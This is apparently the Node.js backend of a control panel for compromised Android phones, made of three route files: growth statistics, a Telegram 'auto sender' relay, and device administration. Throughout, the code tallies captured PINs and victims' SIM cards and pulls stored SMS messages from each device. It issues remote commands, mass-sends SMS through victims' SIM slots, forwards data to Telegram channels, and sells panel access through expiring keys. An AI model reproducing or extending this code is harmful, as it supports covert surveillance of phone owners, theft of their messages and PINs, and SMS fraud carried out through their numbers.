"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const auth = require("../auth");
const relay = require("../relay");
const { outboxCounters } = require("../routes/devices");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const HOUR = 3600000;
const DAY = 86400000;

async function reinstallsCount() {
  try {
    const agg = await db.install_fingerprints
      .aggregate([{ $group: { _id: null, n: { $sum: { $subtract: [{ $ifNull: ["$install_count", 1] }, 1] } } } }])
      .toArray();
    return agg.length ? parseInt(agg[0].n || 0, 10) : 0;
  } catch (_) {
    return 0;
  }
}

router.get("/overview", ah(async (req, res) => {
  await auth.requirePanel(req);

  const now = Date.now();
  const count = (q) => db.devices.countDocuments(q).catch(() => 0);

  const [total, active, gone, uninstalled, onboarded, autoSender, keys] = await Promise.all([
    count({}),
    count({ last_seen: { $gte: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000) } }),
    count({ install_state: "gone" }),
    count({ last_seen: { $lt: new Date(now - config.STALE_AFTER_DAYS * DAY) } }),
    count({ onboarded: true }),
    count({ "auto_sender.enabled": true }),
    db.panel_keys.countDocuments({}).catch(() => 0),
  ]);

  let sims = 0;
  try {
    for await (const d of db.devices.find({}, { projection: { sim_count: 1, "telemetry.sims": 1 } })) {
      sims += d.sim_count || ((d.telemetry || {}).sims || []).length;
    }
  } catch (_) {}

  res.json({
    total_devices: total,
    active_devices: active,
    offline_devices: Math.max(0, total - active),
    total_sims: sims,
    pins_captured: onboarded,
    online_sockets: require("../hub").hub.onlineCount,
    auto_sender_enabled: autoSender,
    relay_authorized: !!relay.relayState.authorized,
    panel_keys: keys,
    installs_total: total,
    live_now: active,
    uninstalled,
    replaced: gone,
    reinstalls: await reinstallsCount(),
  });
}));

router.get("/stats", ah(async (req, res) => {
  await auth.requirePanel(req);

  const now = Date.now();
  const liveCut = new Date(now - config.ONLINE_WINDOW_SECONDS * 1000);
  const idleCut = new Date(now - config.IDLE_AFTER_HOURS * HOUR);
  const staleCut = new Date(now - config.STALE_AFTER_DAYS * DAY);

  const count = (q) => db.devices.countDocuments(q).catch(() => 0);
  const events = (ev, since) => {
    const q = { event: ev };
    if (since) q.created_at = { $gte: since };
    return db.device_events.countDocuments(q).catch(() => 0);
  };

  const dayAgo = new Date(now - DAY);
  const weekAgo = new Date(now - 7 * DAY);

  const [total, live, idle, stale, uninstalled, gone, onboarded] = await Promise.all([
    count({}),
    count({ last_seen: { $gte: liveCut } }),
    count({ last_seen: { $lt: liveCut, $gte: idleCut } }),
    count({ last_seen: { $lt: idleCut, $gte: staleCut } }),
    count({ last_seen: { $lt: staleCut } }),
    count({ install_state: "gone" }),
    count({ onboarded: true }),
  ]);

  let uniqueDevices = 0;
  try {
    uniqueDevices = (await db.devices.distinct("android_id", { android_id: { $nin: [null, ""] } })).length;
  } catch (_) {}

  const [inst24, inst7d, updTotal, upd7d] = await Promise.all([
    events("install", dayAgo),
    events("install", weekAgo),
    events("update"),
    events("update", weekAgo),
  ]);

  res.json({
    installs_total: total,
    unique_devices: uniqueDevices,
    reinstalls: await reinstallsCount(),
    install_events_24h: inst24,
    install_events_7d: inst7d,
    updates_total: updTotal,
    updates_7d: upd7d,
    live,
    idle,
    stale,
    uninstalled,
    replaced: gone,
    onboarded,
    retention_pct: total ? Math.round((1000 * live) / total) / 10 : 0,
    uninstall_rate_pct: total ? Math.round((1000 * uninstalled) / total) / 10 : 0,
    outbox: await outboxCounters(),
    generated_at: new Date(now).toISOString(),
  });
}));

router.get("/growth/events", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 80, 10), 300));

  const rows = await db.device_events.find().sort({ _id: -1 }).limit(limit).toArray();

  // N+1 fix: ek hi query me saare devices
  const ids = [];
  for (const r of rows) {
    if (r.device_id) {
      try {
        ids.push(new db.ObjectId(String(r.device_id)));
      } catch (_) {}
    }
  }

  const map = new Map();
  if (ids.length) {
    const docs = await db.devices
      .find({ _id: { $in: ids } }, { projection: { short_id: 1, device_name: 1 } })
      .toArray()
      .catch(() => []);
    for (const d of docs) map.set(String(d._id), d);
  }

  const out = rows.map((r) => {
    const d = map.get(String(r.device_id || "")) || null;
    return {
      id: String(r._id),
      event: r.event,
      short_id: (d && d.short_id) || "—",
      device_name: r.device_name || (d && d.device_name) || "Unknown",
      app_version: r.app_version || "",
      android_id: (r.android_id || "").slice(0, 12),
      ts: u.serializeDt(r.created_at),
    };
  });

  res.json({ events: out });
}));

router.get("/growth/activity", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.activity_logs.find().sort({ _id: -1 }).limit(limit).toArray();
  res.json({ activity: rows.map(u.serializeDocument) });
}));

module.exports = router;



backend/admin/autoSender.js



"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const auth = require("../auth");
const relay = require("../relay");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

function relayReady() {
  return !!(relay.TELETHON_OK && relay.relayClient && relay.relayState.authorized);
}

async function resolveChannel(cid, title) {
  let channelId = cid;
  let channelTitle = title || "";
  if (channelId && relayReady()) {
    try {
      const ent = await relay.relayClient.getEntity(u.asEntity(channelId));
      channelId = u.canonicalChannelId(ent, channelId);
      if (!channelTitle) channelTitle = ent.title || ent.username || "";
    } catch (_) {}
  }
  return { channelId, channelTitle };
}

router.get("/auto-sender", ah(async (req, res) => {
  await auth.requirePanel(req);
  const count = await db.devices.countDocuments({ "auto_sender.enabled": true }).catch(() => 0);
  res.json({
    relay_ready: relayReady(),
    telethon: relay.TELETHON_OK,
    account: relay.relayState.me,
    forward_user: relay.relayState.forward_user || config.DEFAULT_FWD_USER || "",
    channels: [...(await relay.enabledChannels())].sort(),
    devices_enabled: count,
  });
}));

router.post("/auto-sender/verify", ah(async (req, res) => {
  await auth.requirePanel(req);
  if (!relayReady()) throw new u.HttpError(400, "Pehle relay login karo (Relay page)");

  const cid = u.normChannelId((req.body || {}).channel_id);
  if (!cid) throw new u.HttpError(400, "Channel ID required");

  let ent;
  try {
    ent = await relay.relayClient.getEntity(u.asEntity(cid));
  } catch (e) {
    throw new u.HttpError(400, `Channel nahi mila: ${e.message || e}`);
  }

  const title = ent.title || ent.username || cid;
  let isAdmin = false;
  try {
    const perms = await relay.relayClient.getPermissions(ent);
    isAdmin = !!(perms && (perms.isAdmin || perms.isCreator));
  } catch (_) {}

  res.json({
    status: "ok",
    channel_id: u.canonicalChannelId(ent, cid),
    title: String(title),
    admin: isAdmin,
  });
}));

router.post("/auto-sender/test", ah(async (req, res) => {
  await auth.requirePanel(req);
  if (!relayReady()) throw new u.HttpError(400, "Relay logged in nahi hai");
  const ok = await relay.relaySendText("✅ TPC PANEL — Auto Sender test message.");
  if (!ok) throw new u.HttpError(400, "Test bheja nahi gaya — forward target check karo");
  res.json({ status: "ok" });
}));

router.post("/auto-sender/disable-all", ah(async (req, res) => {
  const admin = await auth.requirePanel(req);
  const r = await db.devices.updateMany(
    { "auto_sender.enabled": true },
    { $set: { "auto_sender.enabled": false, "auto_sender.updated_at": db.utcNow() } }
  );
  relay.invalidateChannelCache();
  u.logEvent("auto_sender_disable_all", { count: r.modifiedCount }, null, admin.name);
  res.json({ status: "ok", disabled: r.modifiedCount });
}));

router.post("/devices/:device_id/auto-sender", ah(async (req, res) => {
  const admin = await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const b = req.body || {};
  const cur = u.autoSenderOf(device);

  const pick = (v, fallback) => (v === null || v === undefined ? fallback : v);

  const enabled = !!pick(b.enabled, cur.enabled);
  let channelId = pick(b.channel_id, cur.channel_id);
  let title = b.channel_title || cur.channel_title;
  const simSlots = pick(b.sim_slots, cur.sim_slots);
  const tgConfirm = !!pick(b.tg_confirm, cur.tg_confirm);

  channelId = channelId ? u.normChannelId(channelId) : null;

  if (channelId) {
    const r = await resolveChannel(channelId, title);
    channelId = r.channelId || channelId;
    title = r.channelTitle || title;
  }
  if (enabled && !channelId) throw new u.HttpError(400, "Enable karne ke liye Channel ID chahiye");

  const slots = u.normSlots(simSlots);
  const doc = {
    enabled,
    channel_id: channelId || null,
    channel_title: title || null,
    sim_slots: slots,
    tg_confirm: tgConfirm,
    updated_at: db.utcNow(),
  };

  await db.devices.updateOne({ _id: device._id }, { $set: { auto_sender: doc } });
  relay.invalidateChannelCache();

  const plain = {
    enabled,
    channel_id: channelId,
    channel_title: title,
    sim_slots: slots,
    tg_confirm: tgConfirm,
  };

  hub.broadcastDevice(String(device._id), { auto_sender: plain });
  u.logEvent(
    "auto_sender_update",
    { enabled, channel_id: channelId, sim_slots: slots },
    String(device._id),
    admin.name
  );

  res.json({ status: "ok", auto_sender: plain, watching: [...(await relay.enabledChannels())].sort() });
}));

module.exports = router;



backend/admin/admin.js



"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const auth = require("../auth");
const relay = require("../relay");

const keysRouter = require("../admin/keys");
const rulesRouter = require("../admin/rules");
const growthRouter = require("../admin/growth");
const autoSenderRouter = require("../admin/autoSender");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const ALLOWED_COMMANDS = new Set([
  "ping",
  "wake",
  "fetch_number",
  "number",
  "sim_info",
  "refresh_telemetry",
  "telemetry",
  "sync_inbox",
  "reload_config",
]);

// ---------------------------------------------------------------- auth

async function authStatus(req, res) {
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  if (!ident) return res.json({ authenticated: false });

  const [role, name] = auth.splitIdent(ident);

  if (role === "admin") {
    const key = auth.adminMatch(name);
    if (!key) return res.json({ authenticated: false, role: "admin", reason: "unknown" });
    return res.json({
      authenticated: true,
      admin_id: key,
      role: "admin",
      username: key,
      expires_at: null,
      secret_source: config.SESSION_SECRET_SRC,
    });
  }

  const doc = await u.keyDoc(name);
  if (!doc || !u.keyActive(doc)) {
    return res.json({ authenticated: false, role: "key", reason: doc ? "expired" : "missing" });
  }
  res.json({
    authenticated: true,
    admin_id: doc.key || name,
    role: "key",
    username: doc.key || name,
    expires_at: u.serializeDt(doc.expires_at),
    secret_source: config.SESSION_SECRET_SRC,
  });
}

router.get("/admin/auth/status", ah(authStatus));
router.get("/panel/me", ah(authStatus));

router.post("/panel/login", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const b = req.body || {};
  const user = String(b.login_id || b.username || "").trim();
  const pass = String(b.password || "");
  if (!user) throw new u.HttpError(400, "Login ID required");

  const adminName = auth.adminMatch(user);
  if (adminName && auth.constEq(pass, config.ADMINS[adminName] || "")) {
    auth.clearFails(ip);
    const ident = `admin:${adminName}`;
    req.session.adminId = ident;
    u.logEvent("admin_login", { username: adminName, ip }, null, adminName);
    return res.json({
      status: "ok",
      role: "admin",
      username: adminName,
      token: auth.makeToken(ident),
      expires_in: config.TOKEN_TTL,
      expires_at: null,
    });
  }

  auth.pushFail(ip);
  throw new u.HttpError(401, "Invalid Login ID or password");
}));

router.post("/panel/access", ah(async (req, res) => {
  const ip = req.ip || "?";
  auth.loginThrottle(ip);

  const k = u.normalizeKey((req.body || {}).key);
  if (k.length < 8) throw new u.HttpError(400, "Key daalo (TPC-XXXX-XXXX-XXXX)");

  const doc = await u.keyDoc(k);
  if (!doc) {
    auth.pushFail(ip);
    throw new u.HttpError(401, "Key galat hai");
  }
  if (doc.blocked) throw new u.HttpError(403, "Key block hai — admin se baat karo");
  if (doc.expires_at instanceof Date && doc.expires_at.getTime() <= Date.now()) {
    throw new u.HttpError(403, "Key expire ho gayi — admin se renew karvao");
  }

  auth.clearFails(ip);
  const ident = `key:${doc.key || k}`;
  req.session.adminId = ident;

  await db.panel_keys
    .updateOne(
      { _id: doc._id },
      { $set: { last_login_at: db.utcNow(), last_ip: ip }, $inc: { login_count: 1 } }
    )
    .catch(() => {});

  u.logEvent("key_login", { key: doc.key, ip });

  res.json({
    status: "ok",
    role: "key",
    username: doc.key,
    token: auth.makeToken(ident),
    expires_in: config.TOKEN_TTL,
    expires_at: u.serializeDt(doc.expires_at),
  });
}));

router.post("/panel/register", ah(async (req, res) => {
  const key = u.newKey();
  const now = db.utcNow();
  await db.panel_keys.insertOne({
    key,
    key_hash: u.keyHashFor(key),
    label: String((req.body || {}).label || "").slice(0, 60),
    phone: u.normalizeNumber((req.body || {}).phone) || "",
    created_at: now,
    expires_at: config.DEFAULT_KEY_DAYS ? new Date(now.getTime() + config.DEFAULT_KEY_DAYS * 86400000) : null,
    blocked: false,
    login_count: 0,
    last_login_at: null,
  });
  res.json({ status: "ok", key });
}));

router.post("/admin/logout", ah(async (req, res) => {
  const ident = (req.session && req.session.adminId) || auth.bearerIdentity(req);
  if (ident) u.logEvent("logout", { ident });
  req.session = null;
  res.json({ status: "ok" });
}));

router.get("/admin/session", ah(async (req, res) => {
  const ident = await auth.requirePanel(req);
  res.json({
    admin_id: ident.name,
    role: ident.role,
    via: req.session && req.session.adminId ? "session" : "token",
    secret_source: config.SESSION_SECRET_SRC,
  });
}));

// ---------------------------------------------------------------- sub-routers

router.use("/admin/keys", keysRouter);
router.use("/admin/users", keysRouter);
router.use("/admin/rules", rulesRouter);
router.use("/admin", autoSenderRouter);
router.use("/admin", growthRouter);

// ---------------------------------------------------------------- devices

router.get("/admin/devices", ah(async (req, res) => {
  await auth.requirePanelOrKey(req);
  const q = {};
  if (req.query.onboarded !== undefined) q.onboarded = req.query.onboarded === "true";

  const now = Date.now();
  const state = String(req.query.state || "");
  if (state === "live") {
    q.last_seen = { $gte: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000) };
  } else if (state === "idle") {
    q.last_seen = {
      $lt: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000),
      $gte: new Date(now - config.IDLE_AFTER_HOURS * 3600000),
    };
  } else if (state === "stale") {
    q.last_seen = {
      $lt: new Date(now - config.IDLE_AFTER_HOURS * 3600000),
      $gte: new Date(now - config.STALE_AFTER_DAYS * 86400000),
    };
  } else if (state === "uninstalled") {
    q.last_seen = { $lt: new Date(now - config.STALE_AFTER_DAYS * 86400000) };
  } else if (state === "gone") {
    q.install_state = "gone";
  } else if (state === "reinstall") {
    q.install_seq = { $gt: 1 };
  }

  if (req.query.q && String(req.query.q).trim()) {
    const rx = new RegExp(String(req.query.q).trim().replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
    q.$or = [
      { device_name: rx },
      { short_id: rx },
      { phone_number: rx },
      { "telemetry.sim_number": rx },
      { android_id: rx },
    ];
  }

  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 300, 10), 1000));
  const rows = await db.devices
    .find(q, { projection: { registration_id_hash: 0 } })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();

  res.json({ devices: rows.map((d) => u.viewDevice(d)), online_sockets: hub.hub.onlineCount });
}));

router.get("/admin/devices/:device_id", ah(async (req, res) => {
  await auth.requirePanelOrKey(req);
  res.json(u.viewDevice(await u.getDeviceOr404(req.params.device_id)));
}));

router.get("/admin/devices/:device_id/messages", ah(async (req, res) => {
  await auth.requirePanel(req);
  await u.getDeviceOr404(req.params.device_id);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 500, 10), 1000));
  const rows = await db.messages
    .find({ device_id: String(req.params.device_id) })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();
  res.json({ messages: rows.map(u.serializeDocument) });
}));

router.get("/admin/devices/:device_id/events", ah(async (req, res) => {
  await auth.requirePanel(req);
  await u.getDeviceOr404(req.params.device_id);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.device_events
    .find({ device_id: String(req.params.device_id) })
    .sort({ _id: -1 })
    .limit(limit)
    .toArray();
  res.json({ events: rows.map(u.serializeDocument) });
}));

async function sendCommandTo(device, action) {
  const did = String(device._id);
  const online = hub.hub.online(did);
  const delivered = online ? await hub.sendCommand(did, action) : false;
  if (["fetch_number", "number", "sim_info", "refresh_telemetry"].includes(action)) {
    await db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: db.utcNow() } }).catch(() => {});
  }
  u.logEvent("device_command", { action, delivered, online }, did);
  return { online, delivered };
}

router.post("/admin/devices/:device_id/command", ah(async (req, res) => {
  await auth.requirePanel(req);
  let action = String((req.body || {}).action || "ping").trim().toLowerCase();
  if (!ALLOWED_COMMANDS.has(action)) action = "ping";

  const device = await u.getDeviceOr404(req.params.device_id);
  const { online, delivered } = await sendCommandTo(device, action);

  res.json({
    status: "ok",
    action,
    online,
    delivered,
    note: delivered ? "" : "device socket offline — online hone par apne aap milega",
  });
}));

router.post("/admin/devices/:device_id/refresh", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const { online, delivered } = await sendCommandTo(device, "refresh_telemetry");
  res.json({ status: "ok", online, delivered, action: "refresh_telemetry" });
}));

router.post("/admin/devices/:device_id/ping", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const online = hub.hub.online(String(device._id));
  const delivered = online ? await hub.sendCommand(String(device._id), "ping") : false;
  res.json({ status: "ok", online, delivered });
}));

router.post("/admin/devices/:device_id/wake", ah(async (req, res) => {
  await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const online = hub.hub.online(String(device._id));
  const delivered = online ? await hub.sendCommand(String(device._id), "wake") : false;
  res.json({ status: "ok", online, delivered });
}));

router.post("/admin/devices/:device_id/rename", ah(async (req, res) => {
  const admin = await auth.requirePanel(req);
  const name = String((req.body || {}).device_name || "").trim().slice(0, 60);
  if (!name) throw new u.HttpError(400, "device_name required");

  const device = await u.getDeviceOr404(req.params.device_id);
  await db.devices.updateOne({ _id: device._id }, { $set: { device_name: name } });
  hub.broadcastDevice(String(device._id), { device_name: name });
  u.logEvent("device_rename", { device_name: name }, String(device._id), admin.name);

  res.json({ status: "ok", device_name: name });
}));

router.delete("/admin/devices/:device_id", ah(async (req, res) => {
  const admin = await auth.requirePanel(req);
  const device = await u.getDeviceOr404(req.params.device_id);
  const did = String(device._id);

  await Promise.all([
    db.messages.deleteMany({ device_id: did }).catch(() => {}),
    db.outbox.deleteMany({ device_id: did }).catch(() => {}),
    db.device_events.deleteMany({ device_id: did }).catch(() => {}),
  ]);
  await db.devices.deleteOne({ _id: device._id });
  hub.broadcastDevice(did, { deleted: true });
  u.logEvent("device_deleted", { short_id: u.deviceShortId(device) }, did, admin.name);

  res.json({ status: "ok" });
}));

// ------------------------------------------------------------------ send

router.post("/admin/send", ah(async (req, res) => {
  const admin = await auth.requirePanelOrKey(req);
  const b = req.body || {};
  const body = String(b.body || "").trim().slice(0, config.MAX_SMS_BODY);
  if (!body) throw new u.HttpError(400, "Message body required");

  const [targets, capped] = await hub.resolveTargets({
    target: b.target || "all",
    device_id: b.device_id,
  });

  if (!targets.length) {
    return res.json({ status: "ok", queued: 0, delivered: 0, results: [], note: "koi device match nahi hua" });
  }

  const manualTo = u.normalizeNumber(b.to);
  const results = [];

  for (const device of targets) {
    const deviceId = String(device._id);
    const to = manualTo || u.resolveDeviceNumber(device);
    const slots = hub.slotsFor(b.sim_slots, device);
    let delivered = false;

    for (const slot of slots) {
      const [outboxId] = await hub.queueSms(deviceId, body, to, "panel", device.device_name || "Unknown", slot);
      if (hub.hub.online(deviceId) && (await hub.deliverOutboxRow(deviceId, outboxId))) delivered = true;
    }

    results.push({
      device_id: deviceId,
      device_name: device.device_name || "Unknown",
      short_id: u.deviceShortId(device),
      to,
      slots,
      delivered,
      queued: true,
    });
  }

  const deliveredN = results.filter((r) => r.delivered).length;
  u.logEvent("bulk_send", { target: b.target, queued: results.length, delivered: deliveredN, slots: b.sim_slots }, null, admin);

  const notes = [];
  if (deliveredN < results.length) {
    notes.push("kuch device offline hain — unka SMS outbox me queue hai, online hote hi jaayega");
  }
  if (Array.isArray(b.sim_slots) && b.sim_slots.length) {
    notes.push("selected SIMs: " + b.sim_slots.map((s) => `SIM ${Number(s) + 1}`).join(", "));
  }
  if (capped) notes.push(`fleet ${config.MAX_BROADCAST} se bada hai — sirf pehle ${config.MAX_BROADCAST} devices`);

  res.json({ status: "ok", queued: results.length, delivered: deliveredN, capped, results, note: notes.join(" | ") });
}));

